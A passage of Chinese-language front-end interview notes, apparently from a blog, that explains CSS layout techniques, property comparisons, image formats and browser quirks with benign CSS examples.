多列等高如何实现？</h3><p>（1）利用padding-bottom|margin-bottom正负值相抵，不会影响页面布局的特点。设置父容器设置超出隐藏（overflow:hidden），这样父容器的高度就还是它里面的列没有设定padding-bottom时的高度，当它里面的任一列高度增加了，则父容器的高度被撑到里面最高那列的高度，其他比这列矮的列会用它们的padding-bottom补偿这部分高度差。</p><p>（2）利用table-cell所有单元格高度都相等的特性，来实现多列等高。</p><p>（3）利用flex布局中项目align-items属性默认为stretch，如果项目未设置高度或设为auto，将占满整个容器的高度<br>的特性，来实现多列等高。</p><h2 id="用纯CSS创建一个三角形？原理是什么？"><a href="#用纯CSS创建一个三角形？原理是什么？" class="headerlink" title="用纯CSS创建一个三角形？原理是什么？"></a>用纯CSS创建一个三角形？原理是什么？</h2><p>采用相邻边框连接处的<strong>均分原理</strong>。</p><p>实现步骤： </p><ul><li>首先保证元素是块级元素；</li><li>将元素宽高设为0，且只设置边框；</li><li>把任意三条边隐藏（颜色设为transparent）。</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="attribute">border-color</span>: transparent transparent red transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何实现单行／多行文本溢出的省略（…）？"><a href="#如何实现单行／多行文本溢出的省略（…）？" class="headerlink" title="如何实现单行／多行文本溢出的省略（…）？"></a>如何实现单行／多行文本溢出的省略（…）？</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*单行文本在父元素中不换行，溢出变省略号*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*多行文本溢出*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.5em</span>;</span><br><span class="line">  <span class="comment">/*高度为需要显示的行数*行高，比如这里我们显示两行，则为3*/</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">3em</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;...&#x27;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="有一个高度自适应的-div，里面有两个-div，一个高度-100px，希望另一个填满剩下的高度。"><a href="#有一个高度自适应的-div，里面有两个-div，一个高度-100px，希望另一个填满剩下的高度。" class="headerlink" title="有一个高度自适应的 div，里面有两个 div，一个高度 100px，希望另一个填满剩下的高度。"></a>有一个高度自适应的 div，里面有两个 div，一个高度 100px，希望另一个填满剩下的高度。</h2><p>（1）外层div使用position：relative；高度要求自适应的div使用position:absolute;top:100px;bottom:0;<br>left:0;right:0;</p><p>（2）使用flex布局，设置主轴为竖轴，第二个div的flex-grow为1。</p><h2 id="图片等比例缩放"><a href="#图片等比例缩放" class="headerlink" title="图片等比例缩放"></a>图片等比例缩放</h2><p>设定 image（最大）宽度或（最大）高度。这样可以使另一边自适应，从而实现等比例缩放。</p><p>使用 CSS 的 background 属性进行等比缩放。<code>background-size: contain;</code></p><p>使用 CSS 的 transform 转换属性直接进行缩放。<code>transform: scale(0.6);</code></p><p>使用 CSS 的 object-fit 属性直接进行图片适应缩放。<code>object-fit: contain;</code></p><h2 id="实现一个宽高自适应的正方形（1）"><a href="#实现一个宽高自适应的正方形（1）" class="headerlink" title="实现一个宽高自适应的正方形（1）"></a>实现一个宽高自适应的正方形（1）</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*1.利用vw来实现*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">10vw</span>;</span><br><span class="line">  <span class="attribute">background</span>: tomato;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2.利用元素的margin/padding百分比是相对父元素width的性质来实现*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">background</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*3.利用子元素的margin-top的值来实现的*/</span></span><br><span class="line"><span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">30%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.square</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="画一条-0-5px-的线"><a href="#画一条-0-5px-的线" class="headerlink" title="画一条 0.5px 的线"></a>画一条 0.5px 的线</h2><ul><li><p>采用meta viewport的方式</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; <span class="attribute">content</span>=&quot;<span class="attribute">width</span>=device-<span class="attribute">width</span>,<span class="attribute">initial</span>-sacle=<span class="number">1</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p>其中width=device-width表示将viewport视窗的宽度调整为设备的宽度，这个宽度通常是指物理上宽度。默认的缩放比例为1，如iphone 6竖屏的宽度为750px，它的dpr=2，用2px表示1px，这样设置之后viewport的宽度就变成375px。</p></li><li><p>采用transform:scale()的方式 (若只采用transform: scaleY(0.5); 会使得线很虚)</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hr</span><span class="selector-class">.scale-half</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="一个自适应矩形，水平垂直居中，且宽高比为-2-1"><a href="#一个自适应矩形，水平垂直居中，且宽高比为-2-1" class="headerlink" title="*一个自适应矩形，水平垂直居中，且宽高比为 2:1"></a>*一个自适应矩形，水平垂直居中，且宽高比为 2:1</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*实现原理参考自适应正方形和水平居中方式*/</span></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">background</span>: tomato;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="css-实现上下固定中间自适应布局？"><a href="#css-实现上下固定中间自适应布局？" class="headerlink" title="*css 实现上下固定中间自适应布局？"></a>*css 实现上下固定中间自适应布局？</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*利用绝对定位实现*/</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用flex布局实现*/</span></span><br><span class="line"><span class="selector-tag">html</span>,</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个满屏品字布局如何设计"><a href="#一个满屏品字布局如何设计" class="headerlink" title="*一个满屏品字布局如何设计?"></a>*一个满屏品字布局如何设计?</h2><p>第一种真正的品字：</p><ol><li>三块高宽是确定的；</li><li>上面那块用margin: 0 auto;居中；</li><li>下面两块用float或者inline-block不换行；</li><li>用margin调整位置使他们居中。</li></ol><p>第二种全屏的品字布局:</p><p>上面的div设置成100%，下面的div分别宽50%，然后使用float或者inline使其不换行。</p><h1 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h1><h2 id="rgba-和-opacity-的透明效果有什么不同？"><a href="#rgba-和-opacity-的透明效果有什么不同？" class="headerlink" title="rgba() 和 opacity 的透明效果有什么不同？"></a>rgba() 和 opacity 的透明效果有什么不同？</h2><p>opacity：作用于元素以及元素内的所有内容（包括文字）的透明度；</p><p>rgba()：只作用于元素自身的颜色或其背景色，子元素不会继承透明效果；</p><h2 id="display-none与visibility-hidden的区别？"><a href="#display-none与visibility-hidden的区别？" class="headerlink" title="display:none与visibility:hidden的区别？"></a>display:none与visibility:hidden的区别？</h2><p>display：none 不显示对应的元素，在文档布局中不再分配空间（回流+重绘）</p><p>visibility：hidden 隐藏对应元素，在文档布局中仍保留原来的空间（重绘）</p><h2 id="width-auto-和-width-100-的区别"><a href="#width-auto-和-width-100-的区别" class="headerlink" title="width:auto 和 width:100%的区别"></a>width:auto 和 width:100%的区别</h2><ul><li><p>width:100%：使元素box的宽度等于父元素的content box的宽度。</p></li><li><p>width:auto：使元素撑满整个父元素，margin、border、padding、content区域会自动分配水平空间。</p></li></ul><h2 id="transition-和-animation-的区别"><a href="#transition-和-animation-的区别" class="headerlink" title="transition 和 animation 的区别"></a>transition 和 animation 的区别</h2><p>transition关注的是CSS property的变化，property值和时间的关系是一个三次贝塞尔曲线。</p><p>animation作用于元素本身而不是样式属性，可以使用关键帧的概念，应该说可以实现更自由的动画效果。</p><h2 id="style-标签写在-body-后与-body-前有什么区别？"><a href="#style-标签写在-body-后与-body-前有什么区别？" class="headerlink" title="style 标签写在 body 后与 body 前有什么区别？"></a>style 标签写在 body 后与 body 前有什么区别？</h2><p>若写在body标签后，由于浏览器以逐行方式对HTML文档进行解析，当解析到写在尾部的样式表（外联或写在style标签）会导致浏览器停止之前的渲染，等待加载且解析样式表完成之后重新渲染，在windows的IE下可能会出现样式失效导致页面闪烁的问题。</p><h2 id="visibility-属性的-collapse-属性值作用？在不同浏览器下的区别？"><a href="#visibility-属性的-collapse-属性值作用？在不同浏览器下的区别？" class="headerlink" title="*visibility 属性的 collapse 属性值作用？在不同浏览器下的区别？"></a>*visibility 属性的 collapse 属性值作用？在不同浏览器下的区别？</h2><p>（1）对于一般的元素，它的表现跟visibility:hidden一样。</p><p>（2）如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟display:none一样，也就是说，它们占用的空间会释放。</p><p>在不同浏览器下的区别：</p><ul><li><p>在谷歌浏览器里，使用collapse值和使用hidden值没有什么区别。</p></li><li><p>在火狐浏览器、Opera和IE11里，使用collapse值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。</p></li></ul><h2 id="font-style-属性中-italic-和-oblique-的区别？"><a href="#font-style-属性中-italic-和-oblique-的区别？" class="headerlink" title="*font-style 属性中 italic 和 oblique 的区别？"></a>*font-style 属性中 italic 和 oblique 的区别？</h2><p>italic和oblique这两个关键字都表示“斜体”的意思。</p><p>区别：italic是使用当前字体的斜体字体，而oblique只是单纯地让文字倾斜。如果当前字体没有对应的斜体字体，则退而求其次，解析为oblique，也就是单纯形状倾斜。</p><h2 id="letter-spacing-与-word-spacing？"><a href="#letter-spacing-与-word-spacing？" class="headerlink" title="*letter-spacing 与 word-spacing？"></a>*letter-spacing 与 word-spacing？</h2><p>letter-spacing可以用来控制字符之间的间距，这里说的“字符”包括英文字母、汉字以及空格等。具有以下一些特性。</p><p>（1）继承性。<br>（2）默认值是normal而不是0。<br>（3）支持负值，且值足够大的时候，会让字符形成重叠，甚至反向排列。<br>（4）和text-indent属性一样，无论值多大或多小，第一行一定会保留至少一个字符。<br>（5）支持小数值，即使0.1px也是支持的。<br>（6）暂不支持百分比值。</p><p>letter-spacing作用于所有字符，但word-spacing仅作用于空格字符。换句话说，word-spacing的作用就是增加空格的间隙宽度。</p><h2 id="white-space-与换行和空格的控制？"><a href="#white-space-与换行和空格的控制？" class="headerlink" title="*white-space 与换行和空格的控制？"></a>*white-space 与换行和空格的控制？</h2><p>white-space属性声明了如何处理元素内的空白字符，这类空白字符包括Space键、Enter键、Tab键产生的空白。因此，white-space可以决定图文内容是否在一行显示（回车空格是否生效），是否显示大段连续空白（空格是否生效）等。其属性值：</p><ul><li>normal：合并空白字符和换行符。</li><li>pre：空白字符不合并，并且内容只在有换行符的地方换行。</li><li>nowrap：该值和normal一样会合并空白字符，但不允许文本环绕。</li><li>pre-wrap：空白字符不合并，并且内容只在有换行符的地方换行，同时允许文本环绕。</li><li>pre-line：合并空白字符，但只在有换行符的地方换行，允许文本环绕。</li></ul><h2 id="png、jpg、gif-这些图片格式解释一下，分别什么时候用。有没有了解过-webp？"><a href="#png、jpg、gif-这些图片格式解释一下，分别什么时候用。有没有了解过-webp？" class="headerlink" title="*png、jpg、gif 这些图片格式解释一下，分别什么时候用。有没有了解过 webp？"></a>*png、jpg、gif 这些图片格式解释一下，分别什么时候用。有没有了解过 webp？</h2><p>（1）BMP，是无损的、既支持索引色也支持直接色的、点阵图。这种图片格式几乎没有对数据进行压缩，所以BMP格式的图片通常具有较大的文件大小。</p><p>（2）GIF是无损的、采用索引色的、点阵图。采用LZW压缩算法进行编码。文件小，是GIF格式的优点，同时，GIF格式还具有支持动画以及透明的优点。但GIF格式仅支持8bit的索引色，所以GIF格式适用于对色彩要求不高同时需要文件体积较小的场景。</p><p>（3）JPEG是有损的、采用直接色的、点阵图。JPEG的图片的优点，是采用了直接色，得益于更丰富的色彩，JPEG非常适合用来存储照片，与GIF相比，JPEG不适合用来存储企业Logo、线框类的图。因为有损压缩会导致图片模糊，而直接色的选用，又会导致图片文件较GIF更大。</p><p>（4）PNG-8是无损的、使用索引色的、点阵图。PNG是一种比较新的图片格式，PNG-8是非常好的GIF格式替代者，在可能的情况下，应该尽可能的使用PNG-8而不是GIF，因为在相同的图片效果下，PNG-8具有更小的文件体积。除此之外，PNG-8还支持透明度的调节，而GIF并不支持。现在，除非需要动画的支持，否则我们没有理由使用GIF而不是PNG-8。</p><p>（5）PNG-24是无损的、使用直接色的、点阵图。PNG-24的优点在于，它压缩了图片的数据，使得同样效果的图片，PNG-24格式的文件大小要比BMP小得多。当然，PNG24的图片还是要比JPEG、GIF、PNG-8大得多。</p><p>（6）SVG是无损的、矢量图。SVG是矢量图。这意味着SVG图片由直线和曲线以及绘制它们的方法组成。当你放大一个SVG图片的时候，你看到的还是线和曲线，而不会出现像素点。这意味着SVG图片在放大时，不会失真，所以它非常适合用来绘制企业Logo、Icon等。</p><p>（7）WebP是谷歌开发的一种新图片格式，WebP是同时支持有损和无损压缩的、使用直接色的、点阵图。从名字就可以看出来它是为Web而生的，什么叫为Web生呢？就是说相同质量的图片，WebP具有更小的文件体积。现在网站上充满了大量的图片，如果能够降低每一个图片的文件大小，那么将大大减少浏览器和服务器之间的数据传输量，进而降低访问延迟，提升访问体验。</p><ul><li>在无损压缩的情况下，相同质量的WebP图片，文件大小要比PNG小26%；</li><li>在有损压缩的情况下，具有相同图片精度的WebP图片，文件大小要比JPEG小25%~34%；</li><li>WebP图片格式支持图片透明度，一个无损压缩的WebP图片，如果要支持透明度只需要22%的格外文件大小。</li></ul><p>但是目前只有Chrome浏览器和Opera浏览器支持WebP格式，兼容性不太好。</p><h3 id="浏览器如何判断是否支持-webp-格式图片"><a href="#浏览器如何判断是否支持-webp-格式图片" class="headerlink" title="浏览器如何判断是否支持 webp 格式图片"></a>浏览器如何判断是否支持 webp 格式图片</h3><p>（1）宽高判断法。通过创建image对象，将其src属性设置为webp格式的图片，然后在onload事件中获取图片的宽高，如果能够获取，则说明浏览器支持webp格式图片。如果不能获取或者触发了onerror函数，那么就说明浏览器不支持webp格式的图片。</p><p>（2）canvas判断方法。我们可以动态的创建一个canvas对象，通过canvas的toDataURL将设置为webp格式，然后判断返回值中是否含有image/webp字段，如果包含则说明支持WebP，反之则不支持。</p><h1 id="特殊性"><a href="#特殊性" class="headerlink" title="*特殊性"></a>*特殊性</h1><h2 id="border-的特殊性？"><a href="#border-的特殊性？" class="headerlink" title="border 的特殊性？"></a>border 的特殊性？</h2><p>（1）border-width不支持百分比。</p><p>（2）border-style的默认值是none。因此只设置border-width或border-color没有边框显示。</p><p>（3）border-style:double的表现规则：双线宽度永远相等，中间间隔±1。</p><p>（4）border-color默认颜色就是color色值。</p><p>（5）默认background背景图片是相对于padding box定位的。</p><h2 id="line-height-的特殊性？"><a href="#line-height-的特殊性？" class="headerlink" title="line-height 的特殊性？"></a>line-height 的特殊性？</h2><p>（1）对于非替换元素的纯内联元素，其可视高度完全由line-height决定。对于文本这样的纯内联元素，line-height就是高度计算的基石，用专业说法就是指定了用来计算行框盒子高度的基础高度。</p><p>（2）内联元素的高度由固定高度和不固定高度组成，这个不固定的部分就是这里的“行距”。换句话说，line-height之所以起作用，就是通过改变“行距”来实现的。在CSS中，“行距”分散在当前文字的上方和下方，也就是即使是第一行文字，其上方也是有“行距”的，只不过这个“行距”的高度仅仅是完整“行距”高度的一半，因此，也被称为“半行距”。</p><p>（3）行距=line-height-font-size。</p><p>（4）border以及line-height等传统CSS属性并没有小数像素的概念。如果标注的是文字上边距，则向下取整；如果是文字下边距，则向上取整。</p><p>（5）对于纯文本元素，line-height直接决定了最终的高度。但是，如果同时有替换元素，则line-height只能决定最小高度。</p><p>（6）对于块级元素，line-height对其本身是没有任何作用的，我们平时改变line-height，块级元素的高度跟着变化实际上是通过改变块级元素里面内联级别元素占据的高度实现的。</p><p>（7）line-height的默认值是normal，还支持数值、百分比值以及长度值。为数值类型时，其最终的计算值是和当前font-size相乘后的值。为百分比值时，其最终的计算值是和当前font-size相乘后的值。为长度值时原意不变。</p><p>（8）如果使用数值作为line-height的属性值，那么所有的子元素继承的都是这个值；但是，如果使用百分比值或者长度值作为属性值，那么所有的子元素继承的是最终的计算值。</p><p>（9）无论内联元素line-height如何设置，最终父级元素的高度都是由数值大的那个line-height决定的。</p><p>（10）只要有“内联盒子”在，就一定会有“行框盒子”，就是每一行内联元素外面包裹的一层看不见的盒子。然后，重点来了，在每个“行框盒子”前面有一个宽度为0的具有该元素的字体和行高属性的看不见的“幽灵空白节点”。</p><h2 id="vertical-align-的特殊性？"><a href="#vertical-align-的特殊性？" class="headerlink" title="vertical-align 的特殊性？"></a>vertical-align 的特殊性？</h2><p>（1）vertical-align的默认值是baseline，即基线对齐，而基线的定义是字母x的下边缘。因此，内联元素默认都是沿着字母x的下边缘对齐的。对于图片等替换元素，往往使用元素本身的下边缘作为基线。：一个inline-block元素，如果里面没有内联元素，或者overflow不是visible，则该元素的基线就是其margin底边缘；否则其基线就是元素里面最后一行内联元素的基线。</p><p>（2）vertical-align:top就是垂直上边缘对齐，如果是内联元素，则和这一行位置最高的内联元素的顶部对齐；如果display计算值是table-cell的元素，我们不妨脑补成<td>元素，则和<tr>元素上边缘对齐。</p><p>（3）vertical-align:middle是中间对齐，对于内联元素，元素的垂直中心点和行框盒子基线往上1/2x-height处对齐。对于table-cell元素，单元格填充盒子相对于外面的表格行居中对齐。</p><p>（4）vertical-align支持数值属性，根据数值的不同，相对于基线往上或往下偏移，如果是负值，往下偏移，如果是正值，往上偏移。</p><p>（5）vertical-align属性的百分比值则是相对于line-height的计算值计算的。</p><p>（6）vertical-align起作用是有前提条件的，这个前提条件就是：只能应用于内联元素以及display值为table-cell的元素。</p><p>（7）table-cell元素设置vertical-align垂直对齐的是子元素，但是其作用的并不是子元素，而是table-cell元素自身。</p><h2 id="overflow-的特殊性？"><a href="#overflow-的特殊性？" class="headerlink" title="overflow 的特殊性？"></a>overflow 的特殊性？</h2><p>（1）一个设置了overflow:hidden声明的元素，假设同时存在border属性和padding属性，则当子元素内容超出容器宽度高度限制的时候，剪裁的边界是border box的内边缘，而非padding box的内边缘。</p><p>（2）HTML中有两个标签是默认可以产生滚动条的，一个是根元素<html>，另一个是文本域<textarea>。</p><p>（3）滚动条会占用容器的可用宽度或高度。</p><p>（4）元素设置了overflow:hidden声明，里面内容高度溢出的时候，滚动依然存在，仅仅滚动条不存在！</p><h2 id="relative-的特殊性？"><a href="#relative-的特殊性？" class="headerlink" title="relative 的特殊性？"></a>relative 的特殊性？</h2><p>（1）相对定位元素的left/top/right/bottom的百分比值是相对于包含块计算的，而不是自身。注意，虽然定位位移是相对自身，但是百分比值的计算值不是。</p><p>（2）top和bottom这两个垂直方向的百分比值计算跟height的百分比值是一样的，都是相对高度计算的。同时，如果包含块的高度是auto，那么计算值是0，偏移无效，也就是说，如果父元素没有设定高度或者不是“格式化高度”，那么relative类似top:20%的代码等同于top:0。</p><p>（3）当相对定位元素同时应用对立方向定位值的时候，也就是top/bottom和left/right同时使用的时候，只有一个方向的定位属性会起作用。而谁起作用则是与文档流的顺序有关的，默认的文档流是自上而下、从左往右，因此top/bottom同时使用的时候，bottom失效；left/right同时使用的时候，right失效。</p><h2 id="text-indent-的特殊性？"><a href="#text-indent-的特殊性？" class="headerlink" title="text-indent 的特殊性？"></a>text-indent 的特殊性？</h2><p>（1）text-indent仅对第一行内联盒子内容有效。</p><p>（2）非替换元素以外的display计算值为inline的内联元素设置text-indent值无效，如果计算值inline-block/inline-table则会生效。</p><p>（3）<input>标签按钮text-indent值无效。</p><p>（4）<button>标签按钮text-indent值有效。</p><p>（5）text-indent的百分比值是相对于当前元素的“包含块”计算的，而不是当前元素。</p><h1 id="场景题"><a href="#场景题" class="headerlink" title="场景题"></a>场景题</h1><h2 id="为什么-li-与-li-之间有看不见的空白间隔？解决办法？"><a href="#为什么-li-与-li-之间有看不见的空白间隔？解决办法？" class="headerlink" title="为什么 li 与 li 之间有看不见的空白间隔？解决办法？"></a>为什么 li 与 li 之间有看不见的空白间隔？解决办法？</h2><p>浏览器会把inline元素间的空白字符（空格、换行、Tab等）渲染成一个空格。而为了美观。我们通常是一个<li>放在一行，这导致<li>换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。</p><p>解决办法：</p><p>（1）为<li>设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。</p><p>（2）将所有<li>写在同一行。不足：代码不美观。</p><p>（3）将<ul>内的字符尺寸直接设为0，即font-size:0。不足：<ul>中的其他字符尺寸也被设为0，需要额外重新设定其他字符尺寸。</p><p>（4）消除<ul>的字符间隔letter-spacing:-8px，不足：这也设置了<li>内的字符间隔，因此需要将<li>内的字符间隔设为默认letter-spacing:normal。</p><h2 id="在网页中应该使用奇数还是偶数的字体？为什么？"><a href="#在网页中应该使用奇数还是偶数的字体？为什么？" class="headerlink" title="在网页中应该使用奇数还是偶数的字体？为什么？"></a>在网页中应该使用奇数还是偶数的字体？为什么？</h2><p>（1）偶数字号相对更容易和web设计的其他部分构成比例关系。</p><p>（2）低版本的浏览器会把奇数字体强制转化为偶数，即13px渲染为14px。</p><h2 id="隐藏元素的-background-image-到底加不加载？"><a href="#隐藏元素的-background-image-到底加不加载？" class="headerlink" title="*隐藏元素的 background-image 到底加不加载？"></a>*隐藏元素的 background-image 到底加不加载？</h2><p>一个元素如果display计算值为none，在IE浏览器下依然会发送图片请求，Firefox浏览器不会，至于Chrome和Safari浏览器：如果隐藏元素同时又设置了background-image，则图片依然会去加载；如果是父元素的display计算值为none，则背景图不会请求。</p><p>如果不是background-image，而是<img>元素，则设置display:none在所有浏览器下依旧都会请求图片资源。</p><p>还需要注意的是如果设置的样式没有对应的元素，则background-image也不会加载。hover情况下的background-image，在触发时加载。</p><h2 id="怎么让-Chrome-支持小于-12px-的文字？"><a href="#怎么让-Chrome-支持小于-12px-的文字？" class="headerlink" title="怎么让 Chrome 支持小于 12px 的文字？"></a>怎么让 Chrome 支持小于 12px 的文字？</h2><p>在谷歌下css设置字体大小为12px及以下时，显示都是一样大小，都是默认12px。</p><p>解决办法：</p><p>（1）可以使用Webkit的内核的-webkit-text-size-adjust的私有CSS属性来解决，只要加了-webkit-text-size<br>-adjust:none;字体大小就不受限制了。但是高版本chrome谷歌浏览器已经不再支持-webkit-text-size-adjust样式。</p><p>（2）可以使用css3的transform缩放属性-webkit-transform:scale(0.5);注意-webkit-transform收缩的是整个元素的大小，如果是内联元素，必须要将它转换成块元素。</p><p>（3）使用图片：如果是内容固定不变情况下，可以将小于12px文字内容做成图片。</p><h2 id="让页面里的字体变清晰，变细用-CSS-怎么做？"><a href="#让页面里的字体变清晰，变细用-CSS-怎么做？" class="headerlink" title="让页面里的字体变清晰，变细用 CSS 怎么做？"></a>让页面里的字体变清晰，变细用 CSS 怎么做？</h2><p>webkit内核的私有属性：-webkit-font-smoothing，用于字体抗锯齿，使用后字体看起来会更清晰舒服。</p><h2 id="如果需要手动写动画，你认为最小时间间隔是多久，为什么？"><a href="#如果需要手动写动画，你认为最小时间间隔是多久，为什么？" class="headerlink" title="如果需要手动写动画，你认为最小时间间隔是多久，为什么？"></a>如果需要手动写动画，你认为最小时间间隔是多久，为什么？</h2><p>多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60*1000ms＝16.7ms</p><h2 id="一道有-bian-趣-tai-的-CSS-场景题"><a href="#一道有-bian-趣-tai-的-CSS-场景题" class="headerlink" title="一道有(bian)趣(tai)的 CSS 场景题"></a>一道有(bian)趣(tai)的 CSS 场景题</h2><p><a href="http://pinkyjie.com/2015/03/02/an-interesting-css-interview/">http://pinkyjie.com/2015/03/02/an-interesting-css-interview/</a></p><h2 id="用div和CSS写一个太极八卦图怎么做，最少需要几个盒子（todo）"><a href="#用div和CSS写一个太极八卦图怎么做，最少需要几个盒子（todo）" class="headerlink" title="用div和CSS写一个太极八卦图怎么做，最少需要几个盒子（todo）"></a>用div和CSS写一个太极八卦图怎么做，最少需要几个盒子（todo）</h2>]]></content>
